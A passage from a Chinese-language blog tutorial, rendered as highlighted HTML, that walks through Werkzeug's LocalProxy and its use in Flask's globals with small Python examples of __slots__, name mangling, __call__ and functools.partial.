        <span class="token keyword">return</span> self<span class="token punctuation">.</span>__local<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> getattr<span class="token punctuation">(</span>self<span class="token punctuation">.</span>__local<span class="token punctuation">,</span> self<span class="token punctuation">.</span>__name__<span class="token punctuation">)</span>        <span class="token keyword">except</span> AttributeError<span class="token punctuation">:</span>            <span class="token keyword">raise</span> RuntimeError<span class="token punctuation">(</span><span class="token string">"no object bound to %s"</span> <span class="token operator">%</span> self<span class="token punctuation">.</span>__name__<span class="token punctuation">)</span>        <span class="token triple-quoted-string string">"""    实现访问不存在属性的操作     localproxy = LocalProxy()    self._get_current_oject().name ==> localproxy.    """</span>              <span class="token keyword">def</span> <span class="token function">__getattr__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> name <span class="token operator">==</span> <span class="token string">"__members__"</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> dir<span class="token punctuation">(</span>self<span class="token punctuation">.</span>_get_current_object<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> getattr<span class="token punctuation">(</span>self<span class="token punctuation">.</span>_get_current_object<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> name<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">__setitem__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> key<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>_get_current_object<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">=</span> value    <span class="token keyword">def</span> <span class="token function">__delitem__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">del</span> self<span class="token punctuation">.</span>_get_current_object<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span>key<span class="token punctuation">]</span>    __call__ <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">,</span> <span class="token operator">*</span>a<span class="token punctuation">,</span> <span class="token operator">**</span>kw<span class="token punctuation">:</span> x<span class="token punctuation">.</span>_get_current_object<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">*</span>a<span class="token punctuation">,</span> <span class="token operator">**</span>kw<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">__call__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span><span class="token operator">*</span>args<span class="token punctuation">,</span><span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">def</span> <span class="token function">wrapper</span><span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">,</span><span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> self<span class="token punctuation">.</span>_get_current_object<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">,</span><span class="token operator">**</span>kwargs<span class="token punctuation">)</span>        <span class="token keyword">return</span> wrapper<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>重载了<code>__call__</code> 后,访问<code>LocalProxy()</code> 相当于访问一个<code>Local()</code> 实例.</p><hr><p>依次解释一下代码</p><ol><li><code>__slots__ = (&quot;__local&quot;)</code>魔法方法<code>__slots__</code>查看<a href="https://docs.python.org/zh-cn/3/reference/datamodel.html?highlight=__slots__#object.__slots__" target="_blank" rel="noopener">官网</a> 它允许显式的声明属性并禁止创建<code>__dict__和__weakref__</code> 用来节省空间,提升查询属性的速度.类似与:</li></ol><pre class="line-numbers language-python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">class</span> <span class="token class-name">Foo</span><span class="token punctuation">:</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>     __slots__ <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">'_local'</span><span class="token punctuation">,</span><span class="token string">'test'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>     <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token operator">>></span><span class="token operator">></span> dir<span class="token punctuation">(</span>Foo<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'__class__'</span><span class="token punctuation">,</span> <span class="token string">'__delattr__'</span><span class="token punctuation">,</span> <span class="token string">'__dir__'</span><span class="token punctuation">,</span> <span class="token string">'__doc__'</span><span class="token punctuation">,</span> <span class="token string">'__eq__'</span><span class="token punctuation">,</span> <span class="token string">'__format__'</span><span class="token punctuation">,</span> <span class="token string">'__ge__'</span><span class="token punctuation">,</span> <span class="token string">'__getattribute__'</span><span class="token punctuation">,</span> <span class="token string">'__gt__'</span><span class="token punctuation">,</span> <span class="token string">'__hash__'</span><span class="token punctuation">,</span> <span class="token string">'__init__'</span><span class="token punctuation">,</span> <span class="token string">'__init_subclass__'</span><span class="token punctuation">,</span> <span class="token string">'__le__'</span><span class="token punctuation">,</span> <span class="token string">'__lt__'</span><span class="token punctuation">,</span> <span class="token string">'__module__'</span><span class="token punctuation">,</span> <span class="token string">'__ne__'</span><span class="token punctuation">,</span> <span class="token string">'__new__'</span><span class="token punctuation">,</span> <span class="token string">'__reduce__'</span><span class="token punctuation">,</span> <span class="token string">'__reduce_ex__'</span><span class="token punctuation">,</span> <span class="token string">'__repr__'</span><span class="token punctuation">,</span> <span class="token string">'__setattr__'</span><span class="token punctuation">,</span> <span class="token string">'__sizeof__'</span><span class="token punctuation">,</span> <span class="token string">'__slots__'</span><span class="token punctuation">,</span> <span class="token string">'__str__'</span><span class="token punctuation">,</span> <span class="token string">'__subclasshook__'</span><span class="token punctuation">,</span> <span class="token string">'_local'</span><span class="token punctuation">,</span> <span class="token string">'test'</span><span class="token punctuation">]</span> <span class="token comment" spellcheck="true"># 这样就显式的创建属性 Foo._local, Foo.test</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="2"><li><code>object.__setattr__(self,&#39;_LocalProxy__local&#39;,local)</code> 属性<a href="../10047.md">拦截 </a>,有3个默认的属性拦截方法:<ul><li><code>__getatt__</code>:当用户访问一个根本不存在*(或者暂时不存在)* 的属性时,你可以通过这个魔法方法来定义类的行为,</li><li><code>__setattr__</code>:它允许你自定义某个属性的赋值行为,不管这个属性存在与否.</li><li><code>__delattr__</code>:删除某个不存在的属性</li></ul></li></ol><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">Foo</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__setattr__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>key<span class="token punctuation">,</span>value<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> value    <span class="token keyword">def</span> <span class="token function">__getattr__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>key<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> key <span class="token operator">==</span> <span class="token string">'a'</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token string">'hello'</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token string">'world'</span>foo <span class="token operator">=</span> Foo<span class="token punctuation">(</span><span class="token punctuation">)</span>foo<span class="token punctuation">.</span>a<span class="token operator">=</span><span class="token number">1</span><span class="token keyword">print</span><span class="token punctuation">(</span>foo<span class="token punctuation">.</span>a<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="3"><li>使用<code>object和self</code> 可以达成相同的效果</li></ol><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">Foo</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span><span class="token punctuation">:</span>        object<span class="token punctuation">.</span>__setattr__<span class="token punctuation">(</span>self<span class="token punctuation">,</span><span class="token string">'att_x'</span><span class="token punctuation">,</span>x<span class="token punctuation">)</span>        object<span class="token punctuation">.</span>__setattr__<span class="token punctuation">(</span>self<span class="token punctuation">,</span><span class="token string">'att_y'</span><span class="token punctuation">,</span>y<span class="token punctuation">)</span>foo <span class="token operator">=</span>Foo<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>foo<span class="token punctuation">.</span>att_x<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>foo<span class="token punctuation">.</span>att_y<span class="token punctuation">)</span><span class="token triple-quoted-string string">"""12"""</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="4"><li>解释一下<code>self.__lcoal</code> 指向的值,在<code>Python</code> 中,默认的<code>__</code> 双下划线表示是有属性,无法从外部直接访问,而且根据<code>PEP8</code> 会直接<a href="https://stackoverflow.com/questions/1301346/what-is-the-meaning-of-a-single-and-a-double-underscore-before-an-object-name" target="_blank" rel="noopener">更名</a>.类似与<code>__span==&gt;_classname_span</code> ,其中<code>classname</code> 为当前类名.</li></ol><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">Test</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>x <span class="token operator">=</span> <span class="token number">10</span>        self<span class="token punctuation">.</span>_x <span class="token operator">=</span> <span class="token number">20</span>        self<span class="token punctuation">.</span>__x <span class="token operator">=</span> <span class="token number">30</span>test <span class="token operator">=</span> Test<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>test<span class="token punctuation">.</span>__dict__<span class="token punctuation">)</span><span class="token triple-quoted-string string">"""{'x': 10, '_x': 20, '_Test__x': 30}其中 test.__x 变成了 _Test__x  """</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="5"><li>所有这里的<code>self.__lcoal</code> 要根据<code>__init__</code> 中的定义一起来理解</li></ol><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">LocalProxy</span><span class="token punctuation">(</span>object<span class="token punctuation">)</span><span class="token punctuation">:</span>    __slots__ <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">"__local"</span><span class="token punctuation">,</span> <span class="token string">"__dict__"</span><span class="token punctuation">,</span> <span class="token string">"__name__"</span><span class="token punctuation">,</span> <span class="token string">"__wrapped__"</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> local<span class="token punctuation">,</span> name<span class="token operator">=</span>None<span class="token punctuation">)</span><span class="token punctuation">:</span>        object<span class="token punctuation">.</span>__setattr__<span class="token punctuation">(</span>self<span class="token punctuation">,</span> <span class="token string">"_LocalProxy__local"</span><span class="token punctuation">,</span> local<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">_get_current_object</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token operator">not</span> hasattr<span class="token punctuation">(</span>self<span class="token punctuation">.</span>__local<span class="token punctuation">,</span> <span class="token string">"__release_local__"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> self<span class="token punctuation">.</span>__local<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> getattr<span class="token punctuation">(</span>self<span class="token punctuation">.</span>__local<span class="token punctuation">,</span> self<span class="token punctuation">.</span>__name__<span class="token punctuation">)</span>        <span class="token keyword">except</span> AttributeError<span class="token punctuation">:</span>            <span class="token keyword">raise</span> RuntimeError<span class="token punctuation">(</span><span class="token string">"no object bound to %s"</span> <span class="token operator">%</span> self<span class="token punctuation">.</span>__name__<span class="token punctuation">)</span>  <span class="token triple-quoted-string string">"""  这里的 self.__local() 相当于访问 self._LocalProxy__lcoal ,而这正好是 init中定义好的变量,所以它指向了 传入的变量 local  """</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="6"><li>最后的<code>__call__</code> 实现了一个闭包函数类似与</li></ol><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">Foo</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__call__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">'1'</span><span class="token keyword">class</span> <span class="token class-name">MyClass</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>foo<span class="token punctuation">)</span><span class="token punctuation">:</span>        object<span class="token punctuation">.</span>__setattr__<span class="token punctuation">(</span>self<span class="token punctuation">,</span><span class="token string">'_MyClass__local'</span><span class="token punctuation">,</span>foo<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> self<span class="token punctuation">.</span>__local    __call__ <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">,</span> <span class="token operator">*</span>a<span class="token punctuation">,</span><span class="token operator">**</span>kw<span class="token punctuation">:</span>x<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">*</span>a<span class="token punctuation">,</span><span class="token operator">**</span>kw<span class="token punctuation">)</span>foo <span class="token operator">=</span> Foo<span class="token punctuation">(</span><span class="token punctuation">)</span>mc <span class="token operator">=</span>MyClass<span class="token punctuation">(</span>foo<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>mc<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">"""'1'"""</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><p>看完代码后,来解释一下为什么会出现<code>LocalProxy</code> ,这主要是解决多个可调用对象的时候出现的问题.</p><p><code>Local</code> 实现了线程之间数据隔离,<code>LocalStack</code> 实现了一个堆栈数据机构,需要处理的线程会被<code>push</code> 到堆栈中,使用完后会释放掉,这样,一个线程中存在多个数据,当访问这些数据时,如何才能访问到自己想要的数据,类似与:</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> werkzeug<span class="token punctuation">.</span>local <span class="token keyword">import</span> LocalStack<span class="token punctuation">,</span>LocalProxyuser_stack <span class="token operator">=</span> LocalStack<span class="token punctuation">(</span><span class="token punctuation">)</span>user_stack<span class="token punctuation">.</span>push<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">'name'</span><span class="token punctuation">:</span><span class="token string">'Jack'</span><span class="token punctuation">}</span><span class="token punctuation">)</span>user_stack<span class="token punctuation">.</span>push<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">'name'</span><span class="token punctuation">:</span><span class="token string">'Bob'</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get_user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> user_stack<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token punctuation">)</span>user <span class="token operator">=</span> get_user<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>user<span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>user<span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">"""BobBob"""</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如果使用<code>LocalProxy</code> ,会得到不同的值</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> werkzeug<span class="token punctuation">.</span>local <span class="token keyword">import</span> LocalStack<span class="token punctuation">,</span>LocalProxyuser_stack <span class="token operator">=</span> LocalStack<span class="token punctuation">(</span><span class="token punctuation">)</span>user_stack<span class="token punctuation">.</span>push<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">'name'</span><span class="token punctuation">:</span><span class="token string">'Jack'</span><span class="token punctuation">}</span><span class="token punctuation">)</span>user_stack<span class="token punctuation">.</span>push<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">'name'</span><span class="token punctuation">:</span><span class="token string">'Bob'</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get_user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> user_stack<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token punctuation">)</span>user <span class="token operator">=</span> LocalProxy<span class="token punctuation">(</span>get_user<span class="token punctuation">,</span><span class="token string">'test'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>user<span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>user<span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">"""BobJack"""</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>使用了<code>LocalProxy</code> 后,它自动更新了<code>user</code> 的值,从而得到了不同的值.类似于:</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> werkzeug<span class="token punctuation">.</span>local <span class="token keyword">import</span> LocalStack<span class="token punctuation">,</span>LocalProxyuser_stack <span class="token operator">=</span> LocalStack<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 查看 线程或协程 对应的字典</span><span class="token keyword">print</span><span class="token punctuation">(</span>user_stack<span class="token punctuation">.</span>_local<span class="token punctuation">.</span>__storage__<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># {}</span>user_stack<span class="token punctuation">.</span>push<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">'name'</span><span class="token punctuation">:</span><span class="token string">'Jack'</span><span class="token punctuation">}</span><span class="token punctuation">)</span>user_stack<span class="token punctuation">.</span>push<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">'name'</span><span class="token punctuation">:</span><span class="token string">'Bob'</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 查看 线程或协程 对应的字典</span><span class="token keyword">print</span><span class="token punctuation">(</span>user_stack<span class="token punctuation">.</span>_local<span class="token punctuation">.</span>__storage__<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># {&lt;greenlet.greenlet object at 0x7f8e3434a5d0>: {'stack': [{'name': 'Jack'}, {'name': 'Bob'}]}}</span><span class="token keyword">def</span> <span class="token function">get_user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> user_stack<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token punctuation">)</span>user <span class="token operator">=</span> LocalProxy<span class="token punctuation">(</span>get_user<span class="token punctuation">,</span><span class="token string">'test'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>user<span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 查看 线程或协程 对应的字典</span><span class="token keyword">print</span><span class="token punctuation">(</span>user_stack<span class="token punctuation">.</span>_local<span class="token punctuation">.</span>__storage__<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># {&lt;greenlet.greenlet object at 0x7f8e3434a5d0>: {'stack': [{'name': 'Jack'}]}}</span><span class="token keyword">print</span><span class="token punctuation">(</span>user<span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>堆栈结构是自动更新的,而使用<code>LocalProxy</code> 后可以连接到自动更新后的堆栈结构中.</p><pre class="line-numbers language-python"><code class="language-python">user <span class="token operator">=</span> LocalProxy<span class="token punctuation">(</span>get_user<span class="token punctuation">,</span><span class="token string">'test'</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token operator">></span> user<span class="token punctuation">.</span>_get_current_object<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">(</span>get_user<span class="token punctuation">,</span><span class="token string">'test'</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token operator">></span> 进行判断       <span class="token keyword">if</span> <span class="token operator">not</span> hasattr<span class="token punctuation">(</span>self<span class="token punctuation">.</span>__local<span class="token punctuation">,</span> <span class="token string">"__release_local__"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> self<span class="token punctuation">.</span>__local<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token operator">></span> 相当于判断       <span class="token keyword">if</span> <span class="token operator">not</span> hasattr<span class="token punctuation">(</span>get_user<span class="token punctuation">,</span> <span class="token string">"__release_local__"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> get_user<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token operator">></span>get_user<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token string">'test'</span><span class="token punctuation">)</span>如上<span class="token punctuation">,</span>访问两次 user<span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>相当于进行了<span class="token number">2</span>次的 get_user<span class="token punctuation">(</span><span class="token punctuation">)</span>赋值<span class="token operator">==</span><span class="token operator">></span>user1<span class="token operator">=</span>get_user<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token string">'test'</span><span class="token punctuation">)</span>        user2<span class="token operator">=</span>get_user<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token string">'test'</span><span class="token punctuation">)</span> user<span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token operator">></span>user1<span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token operator">></span>user2<span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span>对比user <span class="token operator">=</span> get_user<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>可以获得<span class="token number">2</span>个不同的值<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>它的作用是什么呢,这就要看<code>Flask</code> 的<code>global.py</code></p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> functools <span class="token keyword">import</span> partial<span class="token keyword">from</span> werkzeug<span class="token punctuation">.</span>local <span class="token keyword">import</span> LocalProxy<span class="token keyword">from</span> werkzeug<span class="token punctuation">.</span>local <span class="token keyword">import</span> LocalStack_request_ctx_err_msg<span class="token operator">=</span><span class="token string">'...'</span>_app_ctx_err_msg<span class="token operator">=</span><span class="token string">'...'</span><span class="token keyword">def</span> <span class="token function">_lookup_req_object</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">:</span>    top <span class="token operator">=</span> _request_ctx_stack<span class="token punctuation">.</span>top    <span class="token keyword">if</span> top <span class="token keyword">is</span> None<span class="token punctuation">:</span>        <span class="token keyword">raise</span> RuntimeError<span class="token punctuation">(</span>_request_ctx_err_msg<span class="token punctuation">)</span>    <span class="token keyword">return</span> getattr<span class="token punctuation">(</span>top<span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">_lookup_app_object</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">:</span>    top <span class="token operator">=</span> _app_ctx_stack<span class="token punctuation">.</span>top    <span class="token keyword">if</span> top <span class="token keyword">is</span> None<span class="token punctuation">:</span>        <span class="token keyword">raise</span> RuntimeError<span class="token punctuation">(</span>_app_ctx_err_msg<span class="token punctuation">)</span>    <span class="token keyword">return</span> getattr<span class="token punctuation">(</span>top<span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">_find_app</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    top <span class="token operator">=</span> _app_ctx_stack<span class="token punctuation">.</span>top    <span class="token keyword">if</span> top <span class="token keyword">is</span> None<span class="token punctuation">:</span>        <span class="token keyword">raise</span> RuntimeError<span class="token punctuation">(</span>_app_ctx_err_msg<span class="token punctuation">)</span>    <span class="token keyword">return</span> top<span class="token punctuation">.</span>app<span class="token comment" spellcheck="true"># context locals</span>_request_ctx_stack <span class="token operator">=</span> LocalStack<span class="token punctuation">(</span><span class="token punctuation">)</span>_app_ctx_stack <span class="token operator">=</span> LocalStack<span class="token punctuation">(</span><span class="token punctuation">)</span>current_app <span class="token operator">=</span> LocalProxy<span class="token punctuation">(</span>_find_app<span class="token punctuation">)</span>request <span class="token operator">=</span> LocalProxy<span class="token punctuation">(</span>partial<span class="token punctuation">(</span>_lookup_req_object<span class="token punctuation">,</span> <span class="token string">"request"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>session <span class="token operator">=</span> LocalProxy<span class="token punctuation">(</span>partial<span class="token punctuation">(</span>_lookup_req_object<span class="token punctuation">,</span> <span class="token string">"session"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>g <span class="token operator">=</span> LocalProxy<span class="token punctuation">(</span>partial<span class="token punctuation">(</span>_lookup_app_object<span class="token punctuation">,</span> <span class="token string">"g"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里实现了一个<code>request=LocalProxy(partial(_lookup_req_object,&#39;request&#39;))</code></p><p><code>partial</code><a href="https://docs.python.org/zh-cn/3/library/functools.html?highlight=partial#functools.partial" target="_blank" rel="noopener">阅读官方文档</a>高级函数,它提供了一个类似下面的方法.</p><p>假如有如下函数</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">multiply</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> x <span class="token operator">*</span> y<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>现在,如果像返回某个数的双倍,即:</p><pre class="line-numbers language-python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> multiply<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> y<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token number">6</span><span class="token operator">>></span><span class="token operator">></span> multiply<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> y<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token number">8</span><span class="token operator">>></span><span class="token operator">></span> multiply<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> y<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token number">10</span><span aria-hidden="true" 